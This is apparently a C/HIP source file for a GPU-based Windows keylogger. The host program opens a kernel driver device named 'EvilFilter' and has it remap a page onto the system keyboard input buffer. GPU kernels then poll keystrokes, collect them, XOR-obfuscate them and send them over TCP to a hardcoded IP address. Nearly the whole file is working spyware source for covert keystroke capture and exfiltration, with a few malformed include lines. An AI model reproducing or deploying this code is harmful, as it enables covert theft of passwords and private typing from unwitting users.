#include "hip/hip_runtime.h"
#include "stdafx.h"
#include <SharedHeader.h>
#include <stdio.h>
#include <kernelspecs.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
#include <windows.h>
#include <winbase.h>
#include <hip/hip_runtime.h>
#include <hip/hip_runtime.h>
#include "hip/hip_runtime_api.h"
#include ""
#include <DbgEng.h>
#include <process.h>
#include <psapi.h>
#include <time.h>
#include <scancode.h>

#include <winsock.h>

#define DEBUG 1
//#define BUFFER_SIZE 8192
#define BUFFER_SIZE 128

__global__ void copyKeyboardBuffer(PCHAR inBuffer, PCHAR outBuffer, PULONG keystrokeIndex) {
	int index = blockIdx.x*blockDim.x + threadIdx.x;
	// TODO: encrypt keystroke here? XOR 0x65?
	if (index == 0) {
		outBuffer[index] = inBuffer[index] ^ 0x65;
	}
	else {
		outBuffer[index] = inBuffer[index] ^ inBuffer[index - 1] ^ index;
	}
	*keystrokeIndex = 0;
}

__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PULONG keystrokeIndex, PULONG previousState) {
	int index = blockIdx.x*blockDim.x + threadIdx.x;

	if (index == 0) {

		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0

			if (*keystrokeIndex < BUFFER_SIZE) {
				CHAR key = KeyMap[keyboardData->MakeCode];
				if (key == INVALID) {

				}
				else if (key == ENTER) {

				}
				else if (key == LSHIFT) {

				}
				else if (key == RSHIFT) {

				}
				else if (key == CTRL) {

				}
				else if (key == ALT) {

				}
				else if (key == SPACE) {
					cudaBuffer[(*keystrokeIndex)++] = ' ';
				}
				else {
					cudaBuffer[(*keystrokeIndex)++] = KeyMap[keyboardData->MakeCode];
				}
			}
			printf("GPU: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx] [%lu]\n",
				keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
				keyboardData->MakeCode,
				KeyMap[keyboardData->MakeCode],
				keyboardData->UnitId,
				keyboardData->Flags,
				keyboardData->Reserved,
				keyboardData->ExtraInformation, *keystrokeIndex);

			*lastMake = keyboardData->MakeCode;
			*lastModifier = keyboardData->Flags;
				
		}
	}
}

/**
 * The overall strategy here is to make 2 calls to the driver obkect 
 * - the first is to get the offset for the pointer to the keyboard buffer
 * Then I loop through allocating variables until I get one with the correct 
 * offset.  
 * - the second call is with the pointer that has an identical offset
 * so that the driver can remap its page to the page with the keyboard buffer
 * 
 * once I have the maspped pointer I pass it to the CUDA routine so that it can begin monitoring it
 */
int main(int argc, _TCHAR* argv[]) {
#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;

	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData;
		PSHARED_MEMORY_STRUCT dataToTransmit;

		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;

		// Get the Buffer Offset
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
		}
		else {
			ULONG kmdfOffset;
			ULONG keyboardOffset;
			PLLIST listNode;

			kmdfOffset = dataToTransmit->offset;
			printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfOffset);
			keyboardOffset = (ULONG)keyboardData & 0x0fff;
			if (dataToTransmit->largePage) {
				keyboardOffset = (ULONG)keyboardData & 0x1fffff;
			}
			printf("keyboardData is [0x%lx] offset is [0x%lx].\n Trying to get pointer with 'correct' offset [0x%lx]\n", keyboardData, keyboardOffset, kmdfOffset);
			// create a pointer with the correct offset
			listNode = (PLLIST)malloc(sizeof(LLIST));
			listNode->keyboardBuffer = keyboardData;
			listNode->previous = NULL;
			while (keyboardOffset != kmdfOffset) {
				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
				if (dataToTransmit->largePage) {
					keyboardOffset = (ULONG)keyboardData & 0x1fffff;
				}
				else {
					keyboardOffset = (ULONG)keyboardData & 0xfff;
				}
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = keyboardData;
				listNode->previous = previousListNode;
			}

			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
			while (listNode != NULL) {
				PLLIST currentListNode = listNode;
				listNode = listNode->previous;
				if (currentListNode->keyboardBuffer != keyboardData) {
					free(currentListNode->keyboardBuffer);
				}
				free(currentListNode);
			}
			dataToTransmit->ClientMemory = keyboardData;
			dataToTransmit->instruction = 'E';

			// Get the Keyboard Buffer
			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL )) {
				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			}
			else {
				PKEYBOARD_INPUT_DATA d_KeyboardData;
				PCHAR d_KeyMap;
				PCHAR d_KeystrokeBuffer;
				PCHAR d_OutgoingKeystrokeBuffer;
				PUSHORT d_lastMake;
				PUSHORT d_lastModifier;
				PULONG d_keystrokeIndex;
				PULONG d_keyboardState;
				PULONG h_keystrokeIndex;
				PULONG h_keyboardState;
				PCHAR h_KeystrokeBuffer;
				USHORT init0 = 666U;
				ULONG init0long = 0LU;
				ULONG init666long = 666LU;

				printf("Ioctl to EvilFilter device succeeded - we now have the real keyboard buffer.  KeyboardData=[0x%lx]\n", keyboardData);
				//send address to GPU

				checkCudaErrors(hipSetDevice(0));
				checkCudaErrors(hipSetDeviceFlags(hipDeviceMapHost));

				h_keystrokeIndex = (PULONG)malloc(sizeof(ULONG));
				*h_keystrokeIndex = 0;
				h_keyboardState = (PULONG)malloc(sizeof(ULONG));
				*h_keyboardState = 0;
				h_KeystrokeBuffer = (PCHAR)malloc(sizeof(CHAR) * BUFFER_SIZE);

				printf("Allocating device variables...");
				checkCudaErrors(hipMalloc(&d_lastMake,                sizeof(USHORT)));
				checkCudaErrors(hipMalloc(&d_lastModifier,            sizeof(USHORT)));
				checkCudaErrors(hipMalloc(&d_keystrokeIndex,          sizeof(ULONG)));
				checkCudaErrors(hipMalloc(&d_keyboardState,           sizeof(ULONG)));
				checkCudaErrors(hipMalloc(&d_KeystrokeBuffer,         sizeof(CHAR) * BUFFER_SIZE));
				checkCudaErrors(hipMalloc(&d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE));
				checkCudaErrors(hipMalloc((void **)&d_KeyMap,         sizeof(char) * 84));
				printf("Allocated\nZeroing out device variables...");
				checkCudaErrors(hipMemcpy(d_lastMake,       &init0,       sizeof(USHORT),    hipMemcpyHostToDevice));
				checkCudaErrors(hipMemcpy(d_lastModifier,   &init0,       sizeof(USHORT),    hipMemcpyHostToDevice));
				checkCudaErrors(hipMemcpy(d_keystrokeIndex, &init0long,   sizeof(ULONG),     hipMemcpyHostToDevice));
				checkCudaErrors(hipMemcpy(d_keyboardState,  &init666long, sizeof(ULONG),     hipMemcpyHostToDevice));
				checkCudaErrors(hipMemcpy(d_KeyMap,         KeyMap,       84 * sizeof(char), hipMemcpyHostToDevice));	
				printf("Done.\n");

				printf("Registering KeyboardData for use by CUDA...\n");
				checkCudaErrors(hipHostRegister(keyboardData, 10 * sizeof(char), hipHostRegisterMapped));
				printf("getting device pointer for KeyboardData...\n");
				checkCudaErrors(hipHostGetDevicePointer((void **)&d_KeyboardData, (void *)keyboardData, 0));
				// TODO: make last make code and last flag here and pass them back and forth to the CUDA kernel
				printf("Launching CUDA process.\n");
				dim3 grid(1);
				dim3 block(1); 
				while (TRUE) { 
					logKeyboardData <<<1, 1 >>>(d_KeyboardData, d_KeyMap, d_KeystrokeBuffer, d_lastMake, d_lastModifier, d_keystrokeIndex, d_keyboardState);
					checkCudaErrors(hipDeviceSynchronize());

					checkCudaErrors(hipMemcpy(h_keystrokeIndex, d_keystrokeIndex, sizeof(ULONG), hipMemcpyDeviceToHost));
					if (*h_keystrokeIndex >= BUFFER_SIZE) {
						printf("copying buffer.\n");
						copyKeyboardBuffer <<<2, 64 >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
						checkCudaErrors(hipDeviceSynchronize());
						checkCudaErrors(hipMemcpy(h_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE, hipMemcpyDeviceToHost));
						printf("sending buffer.\n"); 
						xmitBuffer(h_KeystrokeBuffer);
					}
				}
			}
		}
		CloseHandle(hControlDevice);
	}
	return 0;
}



void xmitBuffer(char * echoString) {
	int sock;
	struct sockaddr_in echoServAddr;
	USHORT echoServPort = 7;
	PCHAR servIP = "192.168.0.122";
	int echoStringLen;
	WSADATA wsaData;

	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
		fprintf(stderr, "WSAStartup() failed");
		return;
	}
	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "socket() failed");
		return;
	}

	memset(&echoServAddr, 0, sizeof(echoServAddr));
	echoServAddr.sin_family = AF_INET;
	echoServAddr.sin_addr.s_addr = inet_addr(servIP);
	echoServAddr.sin_port = htons(echoServPort);
	if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0) {
		fprintf(stderr, "connect() failed");
		return;
	}

	echoStringLen = strlen(echoString);
	send(sock, echoString, echoStringLen, 0);
	closesocket(sock);
	WSACleanup();

	return;
}



